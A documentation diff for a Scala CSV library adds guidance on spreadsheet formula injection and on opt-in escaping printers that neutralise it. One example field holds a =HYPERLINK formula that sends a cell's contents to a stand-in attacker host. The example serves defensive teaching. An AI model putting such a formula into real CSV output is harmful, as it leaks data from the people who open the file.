@@ -60,3 +60,32 @@ val decoded : Either[Error, List[Bar]] = {
   .flatMap(_.readLabelled[Bar].sequence)
 }
 ```
+
+## Writing CSV that may be opened in a spreadsheet
+
+`Printer.default` implements RFC 4180 quoting, which is what a CSV *parser*
+needs. It does not defend against formula injection: a spreadsheet opening a
+CSV file directly will evaluate a field beginning with `=`, `+`, `-`, `@`, a
+tab or a carriage return. A file built from untrusted input can therefore
+carry a payload to whoever opens it.
+
+If your output may be opened in a spreadsheet, use the escaping printers,
+which prefix such a value with a single quote:
+
+```scala mdoc
+val hostile = CSV.Field("""=HYPERLINK("http://evil.example/?"&A1,"click")""")
+
+// RFC 4180 only -- the formula survives
+Printer.default.print(hostile)
+
+// Neutralised
+Printer.defaultEscapingFormulas.print(hostile)
+```
+
+`Printer.tsvEscapingFormulas` and `Printer.genericEscapingFormulas` are the
+equivalents of `tsv` and `generic`.
+
+This is opt-in rather than the default because prefixing changes the bytes
+written, and plenty of CSV is consumed by another program rather than a
+person, where an unexpected `'` would be a bug. Choose the escaping printers
+at the point where you know the output is destined for a spreadsheet.
